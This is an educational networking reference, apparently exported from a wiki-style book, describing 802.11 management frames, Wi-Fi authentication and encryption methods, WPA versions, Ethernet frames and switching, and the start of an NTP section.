<tr><td style="text-align: center">25 - 32, 34 - 36</td><td style="text-align: center">Vendor Specific</td><td style="text-align: center">Optional</td><td></td></tr>
<tr><td style="text-align: center">33</td><td style="text-align: center">Mobility Domain</td><td style="text-align: center">Optional</td><td>Used with 802.11r Fast BSS Transition.</td></tr>
<tr><td style="text-align: center">37</td><td style="text-align: center">HT Capabilities</td><td style="text-align: center">Optional</td><td>Used with 802.11n.</td></tr>
<tr><td style="text-align: center">38</td><td style="text-align: center">HT Operation</td><td style="text-align: center">Optional</td><td>Used with 802.11n.</td></tr>
<tr><td style="text-align: center">39</td><td style="text-align: center">20/40 BSS Coexistence</td><td style="text-align: center">Optional</td><td>Used with 802.11n.</td></tr>
<tr><td style="text-align: center">40</td><td style="text-align: center">Overlapping BSS Scan Parameters</td><td style="text-align: center">Optional</td><td></td></tr>
<tr><td style="text-align: center">41</td><td style="text-align: center">Extended Capabilities</td><td style="text-align: center">Optional</td><td>See Capability Information.</td></tr>
</tbody></table>
</div>
<h1 id="probe-request-frame"><a class="header" href="#probe-request-frame">Probe Request Frame</a></h1>
<p>Probe request frames are employed by devices seeking to uncover what networks are present on a certain channel. They are typically sent to the broadcast address of <code>FF:FF:FF:FF:FF:FF</code> using the common CSMA/CA procedure. Once a probe request is sent, the sender station initiates a countdown, typically much shorter than the duration of a beacon interval. When the timer runs out, the device process the probe responses it received.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Probe_Request_Frame.svg" alt="" /></p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Order</th><th style="text-align: center">Name</th><th style="text-align: center">Status</th><th>Description</th></tr></thead><tbody>
<tr><td style="text-align: center">1</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#ssid">Service Set Identifier (SSID)</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">2</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-rates--extended-supported-rates">Supported Rates</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">3</td><td style="text-align: center">Request Information</td><td style="text-align: center">Optional</td><td>See below.</td></tr>
<tr><td style="text-align: center">4</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-rates--extended-supported-rates">Extended Supported Rates</a></td><td style="text-align: center">Optional</td><td>See Supported Rates.</td></tr>
<tr><td style="text-align: center">5</td><td style="text-align: center">Vendor-Specific</td><td style="text-align: center">Optional</td><td>Used by the vendor as seen fit.</td></tr>
</tbody></table>
</div>
<p>The SSID of a particular network that the device is looking for may be set in the appropriate field. This way, only the devices bearing the desired SSID should response. Otherwise, the SSID element is still present but is empty. In this case, it signifies a wildcard probe and so all available networks should respond.</p>
<p>The rates supported by the device are sent together with the probe request so as to serve as a reference to the AP's response.</p>
<h2 id="request-information-element"><a class="header" href="#request-information-element">Request Information Element</a></h2>
<p>The <code>Request Information</code> element is optional and may be used to enquire about a particular information element of a network. </p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Request_Information_MFIE.svg" alt="" /></p>
<p>It has an element ID of 10 and its component is a series of 1-byte integers indicating the element IDs of the desired elements. The network should in turn respond with these elements in the Probe Response.</p>
<h3 id="tpc-request"><a class="header" href="#tpc-request">TPC Request</a></h3>
<p>The Transmit Power Control (TPC) Request information element is a notional element used to request radio link management information. It has no associated data and is really only meant as placeholder for a part of a request information element.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/TPC_Request_MFIE.svg" alt="" /></p>
<h1 id="probe-response-frame"><a class="header" href="#probe-response-frame">Probe Response Frame</a></h1>
<p>This is the type of frame which serves as a response to a Probe Request. It closely resembles a beacon frame, since they both answer the same more or less the same questions - they give information about the AP (or a station in IBSS) and the network. In fact, here are the differences:</p>
<ul>
<li>A beacon frame has a TIM field, whereas a probe response does not.</li>
<li>A beacon frame may contain a QoS Information element, announcing basic QoS support.</li>
<li>A probe response will also contain the elements requested in the probe request.</li>
</ul>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Probe_Response_Frame.svg" alt="" /></p>
<p>A probe response frame is sent as a unicast frame with the destination address being the MAC address of the station which issued a probe request. The probe response is transmitted at the lowest mutually supported rate by the AP and the soliciting station. Just like any unicast frame, a probe response should be acknowledged by the recipient station.</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Order</th><th style="text-align: center">Name</th><th style="text-align: center">Status</th><th>Description</th></tr></thead><tbody>
<tr><td style="text-align: center">1</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#timestamp">Timestamp</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">2</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#beacon-interval">Beacon Interval</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">3</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#capability-information">Capability Information</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">4</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#ssid">Service Set Identifier (SSID)</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">5</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-rates--extended-supported-rates">Supported Rates</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">6</td><td style="text-align: center">Frequency-Hopping (FH) Parameter Set</td><td style="text-align: center">Optional</td><td>Used by legacy FH stations.</td></tr>
<tr><td style="text-align: center">7</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#direct-sequence-ds-parameter-set">DS Parameter Set</a></td><td style="text-align: center">Optional</td><td>Present within beacon frames with stations with clause 15, 18, and 19 as their provenance.</td></tr>
<tr><td style="text-align: center">8</td><td style="text-align: center">CF Parameter Set</td><td style="text-align: center">Optional</td><td>Used for PCF and not present in non-notional situations.</td></tr>
<tr><td style="text-align: center">9</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#ibss-parameter-set">IBSS Parameter Set</a></td><td style="text-align: center">Optional</td><td>Used within an IBSS (duh).</td></tr>
<tr><td style="text-align: center">10</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#country">Country</a></td><td style="text-align: center">Optional</td><td>Used with 802.11d and used with 802.11h.</td></tr>
<tr><td style="text-align: center">11</td><td style="text-align: center">FH Parameters</td><td style="text-align: center">Optional</td><td>Used with legacy FH stations.</td></tr>
<tr><td style="text-align: center">12</td><td style="text-align: center">FH Pattern Table</td><td style="text-align: center">Optional</td><td>Used with legacy FH stations.</td></tr>
<tr><td style="text-align: center">13</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#power-constraint">Power Constraint</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h.</td></tr>
<tr><td style="text-align: center">14</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#channel-switch-announcement">Channel Switch Announcement</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h.</td></tr>
<tr><td style="text-align: center">15</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#quiet">Quiet</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h.</td></tr>
<tr><td style="text-align: center">16</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#ibss-dsf">IBSS DSF</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h in an IBSS.</td></tr>
<tr><td style="text-align: center">17</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#tpc-report">TPC Report</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h.</td></tr>
<tr><td style="text-align: center">18</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#extended-rate-phy-erp-element">ERP Information</a></td><td style="text-align: center">Optional</td><td></td></tr>
<tr><td style="text-align: center">19</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-rates--extended-supported-rates">Extended Supported Rates</a></td><td style="text-align: center">Optional</td><td>See Supported Rates.</td></tr>
<tr><td style="text-align: center">20</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#robust-security-network-rsn">RSN</a></td><td style="text-align: center">Optional</td><td></td></tr>
<tr><td style="text-align: center">21</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#bss-load">BSS Load</a></td><td style="text-align: center">Optional</td><td>Used with 802.11e QoS.</td></tr>
<tr><td style="text-align: center">22</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#enhanced-distributed-channel-access-edca-parameter">EDCA Parameter</a></td><td style="text-align: center">Optional</td><td>Used with 802.11e QoS when the QoS capability element is missing.</td></tr>
<tr><td style="text-align: center">23</td><td style="text-align: center">Measurement Pilot Transmission Information</td><td style="text-align: center">Optional</td><td>Used with 802.11k.</td></tr>
<tr><td style="text-align: center">24</td><td style="text-align: center">Multiple BSSID</td><td style="text-align: center">Optional</td><td>Used with 802.11k.</td></tr>
<tr><td style="text-align: center">25</td><td style="text-align: center">RRM Enabled Capabilities</td><td style="text-align: center">Optional</td><td>Used with 802.11k.</td></tr>
<tr><td style="text-align: center">26</td><td style="text-align: center">AP Channel Report</td><td style="text-align: center">Optional</td><td>Used with 802.11k.</td></tr>
<tr><td style="text-align: center">27</td><td style="text-align: center">BSS Average Access Delay</td><td style="text-align: center">Optional</td><td>Used with 802.11k.</td></tr>
<tr><td style="text-align: center">28 - 30</td><td style="text-align: center">Reserved</td><td style="text-align: center">-</td><td></td></tr>
<tr><td style="text-align: center">31</td><td style="text-align: center">Mobility Domain</td><td style="text-align: center">Optional</td><td>Used with 802.11r.</td></tr>
<tr><td style="text-align: center">32</td><td style="text-align: center">DSE Registered Location</td><td style="text-align: center">Optional</td><td>Used with 802.11w.</td></tr>
<tr><td style="text-align: center">33</td><td style="text-align: center">Extended Channel Switch Announcement</td><td style="text-align: center">Optional</td><td>Used with 802.11y.</td></tr>
<tr><td style="text-align: center">34</td><td style="text-align: center">Supported Regulatory Classes</td><td style="text-align: center">Optional</td><td>Used with 802.11y.</td></tr>
<tr><td style="text-align: center">35</td><td style="text-align: center">HT Capabilities</td><td style="text-align: center">Optional</td><td>Used with 802.11n.</td></tr>
<tr><td style="text-align: center">36</td><td style="text-align: center">HT Operation</td><td style="text-align: center">Optional</td><td>Used with 802.11n.</td></tr>
<tr><td style="text-align: center">37</td><td style="text-align: center">20/40 BSS Coexistence</td><td style="text-align: center">Optional</td><td>Used with 802.11n.</td></tr>
<tr><td style="text-align: center">38</td><td style="text-align: center">Overlapping BSS Scan Parameters</td><td style="text-align: center">Optional</td><td></td></tr>
<tr><td style="text-align: center">39</td><td style="text-align: center">Extended Capabilities</td><td style="text-align: center">Optional</td><td>See Capability Information.</td></tr>
<tr><td style="text-align: center">40 - n</td><td style="text-align: center">Requested Information Elements</td><td style="text-align: center">Optional</td><td>The information elements requested in the Probe Request.</td></tr>
<tr><td style="text-align: center">Last</td><td style="text-align: center">Vendor-Specific</td><td style="text-align: center">Optional</td><td>Follows all other elements.</td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-57"><a class="header" href="#introduction-57">Introduction</a></h1>
<p>Before a device can send traffic to an AP it needs to be authenticated and associated with that access point. This is done via a <em>4-way handshake</em>:</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/WiFi_authentication_association.svg" alt="" /></p>
<p>First, the client sends an Authentication Request frame. The AP then returns an Authentication Response. If authentication is allowed by the AP, the client can now send the Association Request, to which the AP will response with an Association Response stating whether or not the association was successful.</p>
<h1 id="authentication"><a class="header" href="#authentication">Authentication</a></h1>
<p>Authentication refers to the verification of a device's identity, but does <em>not</em> include encryption. There are multiple possible protocols for authentication.</p>
<h2 id="open-authentication"><a class="header" href="#open-authentication">Open Authentication</a></h2>
<p>Open Authentication is fairly simple and absolutely insecure. A device needs only send a request to the AP telling it that it wants to authenticate to the network.. If this is allowed, then the client will be associated with the network, no questions asked. When WEP is enabled, however, the client will still need the WEP key in order to encrypt and decrypt traffic. </p>
<h2 id="shared-key-authentication"><a class="header" href="#shared-key-authentication">Shared Key Authentication</a></h2>
<p>This is also sometimes referred to as WEP authentication and <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/../../../Hardware%20Hacking/Wireless%20Attacks/Hacking%20WEP%20Networks.html">isn't secure either</a>.  In shared key authentication, a client needs to already have the WEP key in order to authenticate. When connecting to the network, the AP sends a <em>challenge</em> (random bytes), in clear text, to the client. The client must encrypt the sent challenge with the WEP key and send it back to the AP. When the AP receives the encrypted challenge, it attempts to decrypt it using the WEP key and if the decrypted challenge matches what was originally sent in cleartext, then the client is authenticated.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Resources/Images/Shared_Key_Auth.svg" alt="" /></p>
<h2 id="the-extensible-authentication-protocol-eap"><a class="header" href="#the-extensible-authentication-protocol-eap">The Extensible Authentication Protocol (EAP)</a></h2>
<p>This is not an authentication protocol per se, but is rather a <em>framework</em> and defines a set of functions which are utilised by various authentication protocols, called <em>EAP Methods</em>. EAP is integrated with another protocol, 802.1X, which provides <em>port-based network access control</em> and is used in both wired and wireless networks to limit access. This framework is typically used in enterprises.</p>
<p>There are three main entities in 802.1X:</p>
<ul>
<li><strong>Supplicant</strong> - the device which wants to join the network</li>
<li><strong>Authenticator</strong> - the device providing access to the network</li>
<li><strong>Authentication Server (AS)</strong> - the device receiving credentials and allowing/denying access to the network and </li>
</ul>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Resources/Images/8021X_entities.svg" alt="" /></p>
<p>The authentication required to associate with the AP is simply Open Authentication, however, the device does not get full access to the network. Instead, only traffic for further EAP Authentication is allowed.</p>
<h3 id="lightweight-eap-leap"><a class="header" href="#lightweight-eap-leap">Lightweight EAP (LEAP)</a></h3>
<p>This EAP method was developed by Cisco as an improvement over WEP. Clients are required to provide a username and password for authentication. Additionally, <em>mutual authentication</em> is actuated by both the client and server sending a challenge to each other. From then on, the process of authentication is the same as with Shared Key Authentication. LEAP, however, also avails itself of <em>dynamic WEP keys</em> which change frequently in order to make cracking encryption harder. Unfortunately, LEAP suffers from vulnerabilities like WEP and is insecure.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Resources/Images/LEAP.svg" alt="" /></p>
<h3 id="eap-flexible-authentication-via-secure-tunnelling-eap-fast"><a class="header" href="#eap-flexible-authentication-via-secure-tunnelling-eap-fast">EAP Flexible Authentication via Secure Tunnelling (EAP-FAST)</a></h3>
<p>This method was also developed by Cisco and consists of three phases:</p>
<ul>
<li>the generation and provision of a <em>Protected Access Credential (PAC)</em> from the server to the client</li>
<li>the establishment of a secure TLS tunnel between the authentication server and the client</li>
<li>further authentication by using the TLS tunnel</li>
</ul>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Resources/Images/EAP_FAST.svg" alt="" /></p>
<h3 id="protected-eap-peap"><a class="header" href="#protected-eap-peap">Protected EAP (PEAP)</a></h3>
<p>PEAP is similar to EAP-FAST insofar as it also involves the establishment of a TLS tunnel between the client and the server. However, instead of a PAC, a digital certificate is used. The server is authentication by the client using this certificate and is used for the establishment of the TLS tunnel. However, further authentication is still necessary inside the tunnel in order to authenticate the client to the server.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Resources/Images/PEAP.svg" alt="" /></p>
<h3 id="eap-transport-layer-security-eap-tls"><a class="header" href="#eap-transport-layer-security-eap-tls">EAP Transport Layer Security (EAP-TLS)</a></h3>
<p>In comparison with PEAP, EAP is quite similar but, in addition to the server, it requires that every client has a certificate of its own. This is considered as the most secure EAP authentication method, but is gruelling to implement due to its complexity. </p>
<p>Since both the client and the server are authenticated to each other using the certificates, there is no need for further authentication within a TLS tunnel. Nevertheless, this tunnel is still established for the exchange of encryption key information.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Resources/Images/EAP_TLS.svg" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-58"><a class="header" href="#introduction-58">Introduction</a></h1>
<p>Encryption and Message Integrity Checking are paramount to the world of wireless networks, since the radio signals sent by a device are received by every other device in range.</p>
<h1 id="message-integrity-checks"><a class="header" href="#message-integrity-checks">Message Integrity Checks</a></h1>
<p>Message integrity checking ensures that a frame has not been tampered with by an adversary - the message sent by a device should be the same message received by the recipient. </p>
<p>In order to achieve this, a <em>Message Integrity Check (MIC)</em> is calculated by the sender and added to the message. When the recipient receives the message, the recipient also calculates a MIC based on the message. If the MIC in the message does not match the MIC calculated by the recipient, then the frame is discarded.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Resources/Images/WiFi_Integrity_MIC.svg" alt="" /></p>
<h1 id="encryption-methods"><a class="header" href="#encryption-methods">Encryption Methods</a></h1>
<h2 id="wireless-equivalent-privacy-wep"><a class="header" href="#wireless-equivalent-privacy-wep">Wireless Equivalent Privacy (WEP)</a></h2>
<p>This is the original encryption method introduced by the 802.11 standard which was later found <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/../../../Hardware%20Hacking/Wireless%20Attacks/Hacking%20WEP%20Networks.html">to be vulnerable and insecure</a>. It supports only two authentication modes - <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Authentication%20&amp;%20Association.html#open-authentication">Open System Authentication (OSA)</a> and <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Authentication%20&amp;%20Association.html#shared-key-authentication">Shared Key Authentication (SKA)</a>.</p>
<p>Under the hood, WEP uses a <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/../../../Cryptography/Stream%20Ciphers/index.html">stream cipher</a> called RC4 with a key and a 24-bit <em>initialisation vector (IV)</em> which is generated anew with every encryption. </p>
<p>The key is static and is set in the AP's configuration. It can be either 40 or 104 bits in length and is combined with the 24-bit IV.</p>
<p>The IV is used in combination with the key to encrypt the packets. The IV should be unique for every frame encrypted, but due to its small size - 24 bits - there are only so many possible IVs. Eventually, IVs will have to be repeated and this is where all hell breaks loose. </p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Resources/Images/WEP_RC4.png" alt="" /></p>
<h2 id="temporal-key-integrity-protocol-tkip"><a class="header" href="#temporal-key-integrity-protocol-tkip">Temporal Key Integrity Protocol (TKIP)</a></h2>
<p>This protocol was developed on top of WEP and provides additional security features. Its purpose was to serve as an interim solution to the vulnerabilities in WEP, since hardware at the time was heavily designed around the latter.</p>
<p>It adds a 64-bit MIC to every frame and inside is included sender's MAC address. Furthermore, a timestamp is added to the MIC in order to preclude replay attacks, whereby previously sent frames are retransmitted by an adversary. Moreover a <em>TKIP Sequence Number</em> is used to keep track of frames sent by each source MAC address, which provides further protection against replay attacks.</p>
<p>The IV in TKIP is doubled in size from 24 bits to 48 bits and a <em>Key Mixing Algorithm</em> is implemented in order to generate unique (temporal) WEP keys for every frame.</p>
<p>This encryption method is used by WPA1.</p>
<h2 id="counter--cbc-mac-protocol-ccmp"><a class="header" href="#counter--cbc-mac-protocol-ccmp">Counter / CBC-MAC Protocol (CCMP)</a></h2>
<p>CCMP was developed after TKIP and, due its higher security, finds its use in WPA2. In order to be used, however, it requires special hardware which is not present in ancient devices.</p>
<p>For encryption, CCMP utilises AES <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/../../../Cryptography/Block%20Ciphers/Modes%20of%20Operation.html#the-counter-mode-ctr">counter mode</a>.</p>
<p><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/../../../Cryptography/Block%20Ciphers/Modes%20of%20Operation.html#the-cipher-block-chaining-cbc-mode">Cipher Block Chaining</a> Message Authentication Code (CBC-MAC) is used as a MIC to ensure the integrity of messages.</p>
<h2 id="galois--counter-mode-protocol-gcmp"><a class="header" href="#galois--counter-mode-protocol-gcmp">Galois / Counter Mode Protocol (GCMP)</a></h2>
<p>This protocol provides even further security than CCMP and is additionally more efficient. It is used in WPA3.</p>
<p>For encryption, GCMP also uses AES <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/../../../Cryptography/Block%20Ciphers/Modes%20of%20Operation.html#the-counter-mode-ctr">counter mode</a>. However, it utilises Galois Message Authentication Code (GMAC) for MICs.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-59"><a class="header" href="#introduction-59">Introduction</a></h1>
<p>WPA, WPA2, and WPA3 are consecutive versions of the most-widely used WiFi security standard today. All versions support two authentication modes:</p>
<ul>
<li><strong>Personal Mode</strong> - this mode uses a pre-shared key (PSK) for authentication and is commonly referred to as WPA-PSK. This is typically utilised in home and small office networks. The PSK is derived from the WiFi network's password and its SSID, but is actually never sent over the air for security reasons. Instead, it is used for the derivation of other encryption keys.</li>
<li><strong>Enterprise Mode</strong> - this mode uses <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Authentication%20&amp;%20Association.html#the-extensible-authentication-protocol-eap">802.1X authentication</a> and supports all EAP methods. As the name implies, this authentication mode is typically used in larger enterprise networks.</li>
</ul>
<p>WPA was developed after WEP was found to be vulnerable. Its encryption and MIC were provided by <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Encryption%20&amp;%20Integrity.html#temporal-key-integrity-protocol-tkip">TKIP</a>.</p>
<p>It was superseded by WPA2 in 2004 which utilises <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Encryption%20&amp;%20Integrity.html#counter-cbc-mac-protocol-ccmp">CCMP</a> for encryption and MIC.</p>
<p>WPA3 is the successor to WPA2 introduced in 2018 and uses <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Encryption%20&amp;%20Integrity.html#galois-counter-mode-protocol-gcmp">GCMP</a>. Furthermore, it now mandates <em>Protected Management Frames (PMF)</em> to protect 802.11 <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html">management frames</a> from eavesdropping and forging. Moreover, the 4-way handshake in Personal Mode is protected by <em>Simultaneous Authentication of Equals (SAE)</em> and forward secrecy is used to prevent save-now-decrypt-later attacks of frames.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-60"><a class="header" href="#introduction-60">Introduction</a></h1>
<p>The Ethernet protocol defines how data moves in wired LANs. Its packets are referred to as <em>Ethernet frames</em>. </p>
<p>An Ethernet frame looks like the following:</p>
<p><img src="Networking/Protocols/Resources/Images/Ethernet/Ethernet_Frame.png" alt="" /></p>
<p>Each frame is preceded by a <em>preamble</em> and a <em>start frame delimiter (SFD)</em>. The preamble is a 56-bit long (7 bytes) sequence of alternating 1s and 0s like this 10101010... and allows devices to synchronise their clocks in order to prepare for the receipt of the incoming frame. The preamble is followed by a 1-byte start frame delimiter which is of the same form as the preamble, but ends in a 1: <code>10101011</code>. It signifies the end of the preamble and the start of the actual Ethernet frame. It should be noted that the preamble and SFD are typically <em>not</em> considered part of the frame.</p>
<p>Following are two 6-byte fields which contain the <a href="Networking/Protocols/../The%20TCP-IP%20Suite%20and%20the%20OSI%20Model/(2)%20The%20Datalink%20Layer.html">MAC addresses</a> of the frame's destination and its source. These are the MAC address of the device for which the frame is intended and the MAC address of the device which sent the frame, respectively.</p>
<p>The last member of the Ethernet header is the Length / Type field. It is 2 bytes long. If it has a value \( \leq 1500 \), then it denotes the length (in bytes) of the frame's payload. A value \( \geq 1536 \) is used to signify the layer 3 protocol used in the encapsulated packet. Here is a table of some common protocols and there EtherType values:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Protocol</th><th style="text-align: center">Value</th></tr></thead><tbody>
<tr><td style="text-align: center">ARP</td><td style="text-align: center"><code>0x0806</code></td></tr>
<tr><td style="text-align: center">IPv4</td><td style="text-align: center"><code>0x0800</code></td></tr>
<tr><td style="text-align: center">IPv6</td><td style="text-align: center"><code>0x86DD</code></td></tr>
</tbody></table>
</div>
<p>There is a minimum size of 64 bytes (encapsulating header, payload, and trailer) for any Ethernet frame. This means that the payload must be at least 46 bytes in length. If it is shorter, then it will be padded with null bytes.</p>
<p>Following the payload of the frame is the <em>Ethernet trailer</em>. It is comprised of a single 4-byte member called either the <em>Frame Check Sequence (FCS)</em> or the <em>Cyclic Redundancy Check (CRC)</em>. It renders the service of detecting corrupted data by running a CRC algorithm over the received data.</p>
<h1 id="ethernet-lan-switching"><a class="header" href="#ethernet-lan-switching">Ethernet LAN Switching</a></h1>
<p>Imagine the following network where below each PC is an example MAC address. The switch interfaces <code>FO/i</code> denote <em>fast ethernet</em>.</p>
<p><img src="Networking/Protocols/Resources/Images/Ethernet/Ethernet_Basic_Network.png" alt="" /></p>
<p>Suppose now that PC1 wishes to send a frame to PC2. Such a frame is called a <em>unicast frame</em>, since it is destined for a single target. The frame is sent to the switch and once it is received there, the switch inspects its <em>source</em> MAC address and adds it to its <em>MAC address table</em> together with the corresponding interface. That way, the switch is now cognisant of the fact that the MAC address <code>00:00:01</code> (shortened here for simplicity) can be found at interface <code>FO/1</code>. Such a MAC address is referred to as <em>dynamically-learnt</em>, or simply <em>dynamic</em>. MAC addresses are removed from the switch's MAC address table after a certain period of inactivity, typically 5 minutes. This is known as <em>aging</em>.</p>
<p><img src="Networking/Protocols/Resources/Images/Ethernet/Switch_Frame_Receive.png" alt="" /></p>
<p>SW1 now inspects the destination MAC address of the frame. If the destination MAC is in the switch's table, then the frame is called a <em>known unicast frame</em> and is simply forwarded to its destination on the appropriate interface. Otherwise, the frame is an <em>unknown unicast frame</em> and the switch has only one option - to forward the frame through <em>all</em> of its channels, save for the the frame's provenance. The PCs whose MAC address does not match the frame's destination simply ignore it, but the intended recipient processes it up the full OSI stack. </p>
<p>If the recipient does not send a response, then the exchange ends here. Otherwise, the response frame is sent to sender of the original frame. Once the frame receives it, it records the source MAC address in its table. Since the new destination (PC1) is already present in this table, the frame is subsequently forwarded only to PC1.</p>
<p>The process is pretty much the same when multiple switches are connected to together. In this case, however, multiple PCs may share the same interface in a switch's MAC address table.</p>
<p><img src="Networking/Protocols/Resources/Images/Ethernet/Ethernet_Two_Switches.png" alt="" /></p>
<p>In a Cisco switch, you can use the following command to inspect a switch's MAC address table:</p>
<pre><code>show mac address-table
</code></pre>
<p><img src="Networking/Protocols/Resources/Images/Ethernet/Cisco_Switch_Show_MAC_Address_Table.png" alt="" /></p>
<p><code>Type</code> indicates whether or not the MAC address was statically configured or dynamically-learnt. <code>Ports</code> here means interfaces.</p>
<h1 id="8021q-encapsulation"><a class="header" href="#8021q-encapsulation">802.1Q Encapsulation</a></h1>
<p>When multiple VLANs with trunking are supported in a LAN, they are typically distinguished by dint of the IEEE 802.1Q Encapsulation standard. This standard inserts a 4-byte (32-bit) field, called the <em>802.1Q tag</em>, between the source MAC and type/length fields of the Ethernet header.</p>
<p><img src="Networking/Protocols/Resources/Images/Ethernet/Ethernet_8021q_header.png" alt="" /></p>
<p><img src="Networking/Protocols/Resources/Images/Ethernet/8021q_tag.png" alt="" /></p>
<p>This tag is separated into two main fields - the Tag Protocol Identifier (TPID) and the Tag Control Information (TCI). Each field is two bytes in length.</p>
<p>The TPID is constant and always has the value of <code>0x8100</code>. It is typically located where the type/length field would and is what identifies the frame as a <em>802.1Q-tagged frame</em>.</p>
<p>The TCI is further subdivided into 3 fields. The Priority Code Point (PCP) is 3 bits in length and is utilised for Class of Service (CoS) which assigns different priority to traffic in congested networks. Following is the 1-bit Drop Eligible Indicator (DEI) and it specifies whether or not the frame is allowed to be dropped if the network is congested. The last 12 bits are the VLAN ID (VID) which actually identifies the VLAN that the frame pertains to.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-61"><a class="header" href="#introduction-61">Introduction</a></h1>
<p>The <strong>N</strong>etwork <strong>T</strong>ime <strong>P</strong>rotocol (NTP) is a protocol for clock synchronisation across computer systems. Its existence is paramount in order to pinpoint events occurring at a certain moment within a network. Devices with unsynchronised clocks will report that the event transpired at different times thus making it very difficult to figure out the actual time of occurrence.</p>
<p>This protocol works over UDP on port 123.</p>
<h1 id="how-does-ntp-work"><a class="header" href="#how-does-ntp-work">How does NTP work?</a></h1>
<p>NTP utilises a hierarchy system. Each clock is assigned a <em>stratum</em>. Stratum values range between 0 and 15, with a value of 16 denoting an unsynchronised clock. Devices of Stratum 0 are called reference clocks and these are one of the most accurate time-keeping machines such as atomic clocks. The stratum value, therefore, represents the distance from the reference clock or how accurate a given clock is in comparison to a device of Stratum 0. Every new layer adds a 1 to the stratum value.</p>
